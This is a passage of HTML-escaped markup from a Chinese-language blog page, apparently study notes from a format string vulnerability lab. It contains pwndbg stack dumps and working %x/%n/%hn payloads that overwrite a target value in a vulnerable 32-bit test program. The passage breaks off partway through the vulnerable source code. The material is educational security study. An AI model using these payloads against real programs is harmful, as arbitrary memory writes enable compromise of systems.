class=&#34;string&#34;&gt;&amp;#x27;ddddeeeeffff\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd538&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;eeeeffff\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;002&lt;/span&gt;c│  &lt;span class=&#34;number&#34;&gt;0xffffd53c&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;ffff\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd540&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;\n&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;0034&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd544&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x2c307d&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;&amp;#125;0,&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd548&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                        &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;或者直接si进去查看就好了,关键是怎么在pwntools中进行关联&lt;/p&gt;
&lt;h4 id=&#34;这个顺序是什么顺序呢-从哪里开始呢&#34;&gt;&lt;a href=&#34;#这个顺序是什么顺序呢-从哪里开始呢&#34; class=&#34;headerlink&#34; title=&#34;这个顺序是什么顺序呢?从哪里开始呢?&#34;&gt;&lt;/a&gt;这个顺序是什么顺序呢?从哪里开始呢?&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; ni&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;63.f&lt;/span&gt;7fbd5c0&lt;span class=&#34;number&#34;&gt;.565555&lt;/span&gt;d9.ffffd55a&lt;span class=&#34;number&#34;&gt;.11223344&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.252e7825&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.78252e78&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2e78252&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.252e7825&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56555655&lt;/span&gt; in &lt;span class=&#34;title function_&#34;&gt;fmtstr&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;00:0000│ esp 0xffffd510 —▸ 0xffffd528 ◂— &amp;#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01:0004│     0xffffd514 ◂— 0x63 &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;c&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;02:0008│     0xffffd518 —▸ 0&lt;span class=&#34;title function_&#34;&gt;xf7fbd5c0&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(_IO_2_1_stdin_)&lt;/span&gt; ◂— 0xfbad2288&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;03:000c│     0xffffd51c —▸ 0&lt;span class=&#34;title function_&#34;&gt;x565555d9&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(fmtstr+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)&lt;/span&gt; ◂— add    ebx, 0x19f3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;04:0010│     0xffffd520 —▸ 0xffffd55a ◂— 0x60000100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;05:0014│     0xffffd524 ◂— 0x11223344&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;06:0018│     0xffffd528 ◂— &amp;#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;07:001c│     0xffffd52c ◂— &amp;#x27;x.%x.%x.%x.%x.%x.%x.%x.\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;能看到通过%x输出的是从esp的下一个开始,往ebp方向输出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  252e7825 应该是%x.的ascii之类的?????????????/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;修改内存中的数据&#34;&gt;&lt;a href=&#34;#修改内存中的数据&#34; class=&#34;headerlink&#34; title=&#34;修改内存中的数据&#34;&gt;&lt;/a&gt;修改内存中的数据&lt;/h2&gt;&lt;p&gt;​		一开始会觉得很奇怪,printf不是输出东西的吗, 为什么可以修改数据,这就涉及到一些奇奇怪怪的用法了,printf中有一个%n,会把目前已打印出的字符的个数写入内存,数据在内存中保存的本质就是数字,所以这样就可以修改了&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;target address ffffe43c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data at target address:&lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Segmentation &lt;span class=&#34;title function_&#34;&gt;fault&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(core dumped)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		为什么会一直报这个错呢???&lt;/p&gt;
&lt;p&gt;​	64位和32位可以分别调试一下&lt;/p&gt;
&lt;p&gt;x&amp;#x2F;wx 0xffffe3ec&lt;br&gt;0xffffe3ec:	Cannot access memory at address 0xffffe3ec  &lt;/p&gt;
&lt;p&gt;???&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;► &lt;span class=&#34;number&#34;&gt;0x565555ff&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;&amp;gt;    call   &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;@plt                    &amp;lt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       format: &lt;span class=&#34;number&#34;&gt;0x56555760&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;target address %x\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       vararg: &lt;span class=&#34;number&#34;&gt;0xffffd524&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;pwndbg&amp;gt; x&amp;#x2F;wx 0xffffd524&lt;br&gt;0xffffd524:	0x11223344&lt;/p&gt;
&lt;p&gt;32位可以访问了…&lt;/p&gt;
&lt;p&gt;64位的为什么会崩溃呢? 写入数据的时候 Segmentation fault (core dumped)&lt;/p&gt;
&lt;p&gt;因为不能访问这个地址,为什么不能访问呢? 感觉这个地址有问题,果然,是前面少了东西! 为啥少呢? 和源代码里面的%x有关系吗,gdb也没提示这个呀….&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;wx &lt;span class=&#34;number&#34;&gt;0x7fffffffe3e8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffffe3e8&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0xf7ffe710&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;wx &lt;span class=&#34;number&#34;&gt;0xffffe3ec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffe3ec&lt;/span&gt;:	Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0xffffe3ec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;wx &lt;span class=&#34;number&#34;&gt;0x7fffffffe3ec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffffe3ec&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;p&gt;先用试错法,不加%n找到要修改的地址的位置距离va_list指针有几个移动位置(每一个%x会输出一个东西,然后va_list指针移动,我们需要把它移动到存储要修改的内容的地址的地方)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings&lt;span class=&#34;meta&#34;&gt;# echo $(printf &lt;span class=&#34;string&#34;&gt;&amp;quot;\x64\xd4\xff\xff&amp;quot;&lt;/span&gt;).%x.%x.%x.%x.%x.%x &amp;gt; input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &amp;lt; input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target address ffffd464&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data at target address:&lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;please enter a &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;:d&lt;span class=&#34;number&#34;&gt;.63&lt;/span&gt;.f7fbd5c0&lt;span class=&#34;number&#34;&gt;.565555&lt;/span&gt;d9.ffffd49a&lt;span class=&#34;number&#34;&gt;.11223344&lt;/span&gt;.ffffd464&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data at target address: &lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;需要移动五个位置才能到ffffd464,5个%x,然后%n把前面的数据写入到这个地址&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings&lt;span class=&#34;meta&#34;&gt;# echo $(printf &lt;span class=&#34;string&#34;&gt;&amp;quot;\x74\xd5\xff\xff&amp;quot;&lt;/span&gt;).%x.%x.%x.%x.%x.%n &amp;gt; input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &amp;lt; input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target address ffffd574&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data at target address:&lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;please enter a &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;:t���&lt;span class=&#34;number&#34;&gt;.63&lt;/span&gt;.f7fbd5c0&lt;span class=&#34;number&#34;&gt;.565555&lt;/span&gt;d9.ffffd5aa&lt;span class=&#34;number&#34;&gt;.11223344&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data at target address: &lt;span class=&#34;number&#34;&gt;0x2c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;0x2c 也就是 32 + 12 &amp;#x3D; 44&lt;/p&gt;
&lt;p&gt;44怎么来的呢,遇到%n之前输出了44个字符,5 * 8 &amp;#x3D; 40,这是第 1 3456个输出, 第二个输出是63 也就是两位,&lt;/p&gt;
&lt;p&gt;4 + 2 + 4*8 + 6 &amp;#x3D; 44&lt;/p&gt;
&lt;p&gt;4(\x64\xd4\xff\xff) + 2(63) + 4 *8  + 6(点) &amp;#x3D; 44 ,就是这一串:t���.63.f7fbd5c0.565555d9.ffffd5aa.11223344.&lt;/p&gt;
&lt;h2 id=&#34;修改内存中数据为指定值&#34;&gt;&lt;a href=&#34;#修改内存中数据为指定值&#34; class=&#34;headerlink&#34; title=&#34;修改内存中数据为指定值&#34;&gt;&lt;/a&gt;修改内存中数据为指定值&lt;/h2&gt;&lt;h3 id=&#34;修饰符&#34;&gt;&lt;a href=&#34;#修饰符&#34; class=&#34;headerlink&#34; title=&#34;修饰符&#34;&gt;&lt;/a&gt;修饰符&lt;/h3&gt;&lt;p&gt;​		这里涉及到指定值的大小问题,如果很大的值肯定不能一直堆字符,用精度或者宽度修饰符来解决&lt;/p&gt;
&lt;p&gt;​		echo $(printf “\x64\xd4\xff\xff”).%.8x.%x.%x.%x.%.10000000x.%n &amp;gt; input&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings&lt;span class=&#34;meta&#34;&gt;# echo $(printf &lt;span class=&#34;string&#34;&gt;&amp;quot;\x64\xd4\xff\xff&amp;quot;&lt;/span&gt;).%.8x.%x.%x.%x.%x.%n &amp;gt; input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &amp;lt; input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target address ffffd464&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data at target address:&lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;please enter a &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;:d&lt;span class=&#34;number&#34;&gt;.00000063&lt;/span&gt;.f7fbd5c0&lt;span class=&#34;number&#34;&gt;.565555&lt;/span&gt;d9.ffffd49a&lt;span class=&#34;number&#34;&gt;.11223344&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data at target address: &lt;span class=&#34;number&#34;&gt;0x32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;精度修饰符:&lt;/p&gt;
&lt;p&gt;宽度修饰符:&lt;/p&gt;
&lt;p&gt;&lt;font color=&#34;red&#34;&gt;但是这样做也有问题,需要打印很多字符,耗时耗资源&lt;/font&gt;&amp;gt;&lt;/p&gt;
&lt;h3 id=&#34;更快的办法&#34;&gt;&lt;a href=&#34;#更快的办法&#34; class=&#34;headerlink&#34; title=&#34;更快的办法&#34;&gt;&lt;/a&gt;更快的办法&lt;/h3&gt;&lt;p&gt;​		格式规定符的长度修饰符&lt;/p&gt;
&lt;p&gt;​		%n:视参数为4字节整型数&lt;/p&gt;
&lt;p&gt;​		%hn:视参数为2字节短整型数&lt;/p&gt;
&lt;p&gt;​		%hhn:视参数为1字节字符型数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;2b&lt;/span&gt;x &lt;span class=&#34;number&#34;&gt;0xffffd416&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd416&lt;/span&gt;:     &lt;span class=&#34;number&#34;&gt;0x22&lt;/span&gt;    &lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;2b&lt;/span&gt;x &lt;span class=&#34;number&#34;&gt;0xffffd414&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xffffd414&lt;/span&gt;:     &lt;span class=&#34;number&#34;&gt;0x44&lt;/span&gt;    &lt;span class=&#34;number&#34;&gt;0x33&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;echo $(printf “\x66\xd4\xff\xff@@@@\x64\xd4\xff\xff”)%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn &amp;gt; input&lt;/p&gt;
&lt;p&gt;data at target address: 0x6688779&lt;/p&gt;
&lt;h1 id=&#34;利用格式化字符串漏洞注入恶意代码&#34;&gt;&lt;a href=&#34;#利用格式化字符串漏洞注入恶意代码&#34; class=&#34;headerlink&#34; title=&#34;利用格式化字符串漏洞注入恶意代码&#34;&gt;&lt;/a&gt;利用格式化字符串漏洞注入恶意代码&lt;/h1&gt;&lt;p&gt;漏洞源代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fmtstr&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *str)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; 